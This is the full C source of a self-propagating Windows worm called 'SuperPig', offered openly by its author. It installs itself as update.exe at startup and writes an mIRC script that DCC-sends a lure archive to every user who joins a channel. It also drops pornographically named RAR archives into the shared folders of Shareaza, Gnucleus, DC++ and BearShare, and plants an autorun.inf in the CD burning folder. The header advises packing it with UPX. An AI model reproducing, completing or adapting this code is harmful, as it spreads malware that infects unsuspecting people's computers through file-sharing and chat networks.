/**************************************************************************************************
 * This is my attempt to create a full working worm ... This babe will do this:                   *
 * Checks if an other istance of the worm is running                                              *
 * Copies itself in windows directory with the name update.exe                                    *
 * Sets update.exe at startup                                                                     *
 * Infects MiRC                                                                                   *
 * Infects ShareAza ( copies itself in download directory )                                       *
 * Infects Gnucleus ( Finds shared folder :) )                                                    *
 * Infects DC++     ( like gnucleus )                                                             *
 * Infects BearShare ( The worm uses the download directory )                                     *  
 * If the day % 2 == 0 opens the browser and goes to http://www.freetibet.org and displays a MsG  *
 * Spreads using built-in CD burning function                                                     *
 * After compiling this compress it with upx: upx -9 SuperPig.exe                                 *
 * You can contact me at: wargame89@yahoo.it                                                      *
 * Tested only under WinXP                                                                        *
 * P.S: This shit could be buggy ... and I know my coding style is lame                           *
 **************************************************************************************************/
#include <windows.h>
#include <stdio.h>
           
           /* This is the path of the directory in which the worm will copy itself */
static char DOWNPATH[MAX_PATH];

           /* This is the function that uses built-in cd burning */
void CDBurnsMySelf(char *my)
{
           HKEY hKey;
           char folder[MAX_PATH];
	   DWORD len = MAX_PATH,fuck;
	   HANDLE fd = NULL;

        /* Gets the special folder ... */

         if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",0,KEY_QUERY_VALUE,&hKey) !=
                 ERROR_SUCCESS)
                                {
	                       return;
                                }

         if(RegQueryValueEx(hKey,"CD Burning",0,NULL,folder,&len) != ERROR_SUCCESS)
                                {
                              return;
                                }

         RegCloseKey(hKey);

         SetCurrentDirectory(folder);
 
		          /* Infinite loop */
        while(1) {
			 /* Copies itself and creates autorun.inf */
                  CopyFile(my,"UPDATER.exe",FALSE);

                         /* Creates and writes autorun.inf */
         fd = CreateFile("autorun.inf",GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,NULL);

                            if(fd != INVALID_HANDLE_VALUE)
                            {
                                WriteFile(fd,"[autorun]\r\nopen=UPDATER.exe",27,&fuck,NULL);
                                CloseHandle(fd);
                            }

                            else
                            {
                                return ;
                            }

                            Sleep(1000*60*20); /* Waits 20 minutes */

                 }
}
                         /* This function is to create .rar files ! */
void MakeRar(char *my,char *name)
{
	HANDLE Check = CreateFile(name,GENERIC_READ,FILE_SHARE_READ,NULL,
	OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	 if(Check == INVALID_HANDLE_VALUE) 
	 {
	AddToRar(name,my,my,FILE_ATTRIBUTE_NORMAL);
	 }
	 else
	 {
	 CloseHandle(Check);
	 }
}
                   /* Copying ... */
void CopyMySelf(char *my)
{
       char name[256];
	   int cnt1,cnt2,cnt3;
	   char *names1[] = {"pornostars_fucking_lesbian_super_","asian_fucking_veryhard_",
		   "lesbian_gangbang_","lolita_teen_fucking_","brasilian_girls_fucking_"};
	   char *names2[] = {"mayagold_nikkianderson_","terapatrick_evahenger_","superpornostars_"};
	   char *names3[] = {"high_quality_photo","hard_image"};
	   char *file_names[] = {"FREE_PORNO_ACCESS.exe","XXX_PASSWORD_CRACKER.exe","GRATIS_SEX.exe"};
	   char *used_file = file_names[GetTickCount()%3];

                            /* Changes cwd */
                  SetCurrentDirectory(DOWNPATH);

                            /* This is the file inside the .cab files */
                  CopyFile(my,used_file,FALSE);

           /* This will generate 30 files ... */
		for(cnt1 = 0;cnt1 < 5;cnt1++) 
		{

                   for(cnt2 = 0;cnt2 < 3;cnt2++)
				   {

                           for(cnt3 = 0;cnt3 < 2;cnt3++) 
						   {

                                          /* Creates the name for the .cab */
                                   sprintf(name,"%s%s%s.jpg.rar",names1[cnt1],names2[cnt2],names3[cnt3]);
                                   MakeRar(used_file,name);

                           }

                   }

           }
                                  /* Deletes the .exe file */
		           DeleteFile(used_file);
}

                  /* This is to infect BearShare */
void BearShareInfection(char *my)
{
         HKEY hKey;
	 DWORD len = MAX_PATH;
	 char freepeers[MAX_PATH],bearpath[MAX_PATH];
         DWORD pr;

                                    /* Obtains BearShare path from registry */
         if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\BearShare",0,
                     KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
		 {
			 return;
		 }

                                if(RegQueryValueEx(hKey,"InstallDir",0,
                                          NULL,bearpath,&len) != ERROR_SUCCESS)
                                {
								    RegCloseKey(hKey); 
									return;
								}
								

								/* closes registry stuff */
                                

                                /* Gets the path of download directory */
				                strcpy(freepeers,bearpath);

                                /* Ok this is FreePeers.ini */
                                strcat(freepeers,"\\FreePeers.ini");

                                /* Reads in ini file */
								memset(DOWNPATH,0,MAX_PATH);
						        GetPrivateProfileString("Downloads","szDownloadsDir",NULL,DOWNPATH,
							       MAX_PATH,freepeers);

								/* Cleats path */
								for(pr = strlen(DOWNPATH);pr > 0;pr--) 
								{
									if(DOWNPATH[pr] == '\\') 
									{
										DOWNPATH[pr] = 0;
										break;
									}
								}

								strcpy(DOWNPATH,DOWNPATH+1);

								/* COPY ! */
								CopyMySelf(my);
}
                /* Gnucleus infection */
void GnucleusInfection(char *my)
{
	HKEY hKey;
	char gnucleuspath[MAX_PATH];
	DWORD len = MAX_PATH,cr;

                /* Gets gnucleus path from registy */
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Gnucleus",
                 0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
                        {
                             return;
                        }

    if(RegQueryValueEx(hKey,"UninstallString",0,NULL,gnucleuspath,&len)
                 != ERROR_SUCCESS)
                        {
                        return;
                        }

                 RegCloseKey(hKey);

                 gnucleuspath[strlen(gnucleuspath)-1] = 0;
				 strcpy(gnucleuspath,gnucleuspath+1);

                                   for(cr = strlen(gnucleuspath);cr > 0;cr--)
                                   {

                                         if(gnucleuspath[cr] == '\\')
                                         {
				                       		 gnucleuspath[cr] = 0;
					                         break;
										 }

                                    }

                           memset(DOWNPATH,0,MAX_PATH);
				           strcat(gnucleuspath,"\\GnuConfig.ini");

                           /* Reads in ini file */
						   GetPrivateProfileString("Share","Dir0",NULL,DOWNPATH,
							   MAX_PATH,gnucleuspath);

						   /* Clears path */
						   for(cr = 0;cr < strlen(DOWNPATH);cr++) 
						   {
							   if(DOWNPATH[cr] == '\n' || DOWNPATH[cr] == '\r' ||
								   DOWNPATH[cr] == ',') 
							   {
								   DOWNPATH[cr] = 0;
							   }
						   }

						   CopyMySelf(my);
}
                    /* Infects DC++ */
void DCPlusPlusInfection(char *my)
{
	char dcpluspluspath[MAX_PATH],line[256],*part = NULL;
	HKEY hKey;
	FILE *fd = NULL;
	DWORD len = MAX_PATH,cr;

         /* As usual gets path from registry */
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\DC++",
                0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
                        {
                            return;
                        }

       if(RegQueryValueEx(hKey,"Install_Dir",0,NULL,
                dcpluspluspath,&len) != ERROR_SUCCESS)
                        {
                       return;
                        }

                   RegCloseKey(hKey);

                   strcat(dcpluspluspath,"\\HashIndex.xml");
	               memset(DOWNPATH,0,MAX_PATH);

                        /* Open HashIndex.xml */
           if((fd = fopen(dcpluspluspath,"rb")) == NULL)
           {
            return;
           }

                        /* OK Finds a shared folder */
	                while(!feof(fd))
                    {
				           	 memset(line,0,256);
					         fgets(line,256,fd);

                        /* If you want to understand this look at HashIndex.xml file */
				/* Very lame string operations ! */
					 if(strstr(line,"<File Name="))
                     {

                                        	    /* I do not use strtok() here because in my tests it crashed */
						 for(cr = 0;cr < strlen(line);cr++)
                         {

                                                	 if(line[cr]== '"')
                                                     {
							                                strcpy(line,line+cr+1);
							                                break;
													 }

                         }
						 for(cr = strlen(line);cr > 0;cr--)
                                                 {

                                                     if(line[cr]== '\\')
                                                     {
                                                     line[cr] = 0;

                                                            /* Yahoo shared folder got ! */
				                                     strcpy(DOWNPATH,line);
					                                 CopyMySelf(my);
                                                     fclose(fd);
                                                     return;
                                                     }

                                                 }

                                         }

                }

                fclose(fd); /* Closes file */
}
          /* Infects ShareAza */
void ShareazaInfection(char *my)
{
	HKEY hKey;
	DWORD len = MAX_PATH;
 
	   /* This time is simple I read download directory in registry ... */
       memset(DOWNPATH,0,MAX_PATH);
if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Shareaza\\Shareaza\\Downloads",
               0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
                     {
                     return;
                     }

if(RegQueryValueEx(hKey,"CompletePath",0,NULL,DOWNPATH,&len)
               != ERROR_SUCCESS)
                     {
                    return;
                     }
                           RegCloseKey(hKey);
                           /* COPY! */
                           CopyMySelf(my);
}
    /* This is the mirc infection routine */
void MiRcInfection(char *my) 
{
        HKEY hKey;
        unsigned char mircpth[1024],mirc[MAX_PATH];
        int i=0;
        HANDLE fd = NULL;
        DWORD mircpthlen=sizeof(mircpth),fuck;
           
                     /* Gets the path of mirc from registry */
           if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC",
                     0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
                             {
                             return;
                             }
           
           if(RegQueryValueEx(hKey,"UninstallString",0,NULL,mircpth,&mircpthlen)
                     != ERROR_SUCCESS)
                             {
                             return;
                             }
               
                                 RegCloseKey(hKey);
                                 i=1;

                     /* Plays with the read path */
            while (mircpth[i] != 0 && mircpth[i] != '.')
            {
	           mirc[i-1]=mircpth[i];
	           i++;
			}
                    
                      mirc[i-1]=0;
                      i=strlen(mirc);

            while (mirc[i] != 92)
            {
	           mirc[i]=0;
	           i--;
			}

                      mirc[strlen(mirc)-1] = '\0';

                            /* Mirc path found ! */
                     SetCurrentDirectory(mirc);

                            /* Creates the irc dropper */
                     CopyFile(my,"SEX.exe",FALSE);
                     MakeRar("SEX.exe","SUPERPORNO.rar");
                     DeleteFile("SEX.exe");

                     fd = CreateFile("script.ini",GENERIC_WRITE,FILE_SHARE_WRITE,NULL
                            ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

            if(fd != INVALID_HANDLE_VALUE)
            {
                   WriteFile(fd,"[Script]\r\nn0=on 1:join:#: { if ( $nick == $me ) halt\r\nn1=else /dcc send $nick SUPERPORNO.rar }",
                            94,&fuck,NULL);
  	               CloseHandle(fd);
            }
                       /* DONE! */
}
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	char MyPath[MAX_PATH],cp[MAX_PATH];
	SYSTEMTIME tm;
                 
	/* Checks if an other istance of the worm is running */
	CreateMutex(NULL,FALSE,"SuperPig");

                  if(GetLastError() == ERROR_ALREADY_EXISTS)
                  {
                        ExitProcess(0);
                  }

                          /* Gets worm path */
	          if(GetModuleFileName(NULL,MyPath,MAX_PATH) == 0)
                  {
                  ExitProcess(0);
                  }

                 /* Gets windows directory */
	GetWindowsDirectory(cp,MAX_PATH);

                 /* Copies itself and sets at startup */
	strcat(cp,"\\update.exe");
	CopyFile(MyPath,cp,FALSE);
	WriteProfileString("windows","run",cp);

     /* Installs its own exceptions' handler */
	__asm
        {
       Installs_handler:
              push offset Exception
              push dword ptr fs:[0]
              mov  dword ptr fs:[0],esp
              jmp Dummy
       Exception:
              push 0
              call ExitProcess /* Simply exits */
       Dummy:
         }
                 /* Infects mirc */
        MiRcInfection(MyPath);

                 /* Infects Shareaza */
        ShareazaInfection(MyPath);

                 /* Infects gnucleus */
        GnucleusInfection(MyPath);

                 /* Infects DC++ */
        DCPlusPlusInfection(MyPath);

                 /* Infects BearShare */
        BearShareInfection(MyPath);

                 /* Gets System's time */
        GetSystemTime(&tm);

                         if(tm.wDay % 2 == 0)
                         {
                         ShellExecute(NULL,"open","http://www.freetibet.org",
                                    NULL,NULL,SW_SHOW);
                         MessageBox(NULL,"This r00x !!! ... This is SuperPig by [WarGame,#eof]","Credits",
                                    MB_OK|MB_ICONINFORMATION);
                         }
                
				/* CD Burning */
        CDBurnsMySelf(MyPath); 
}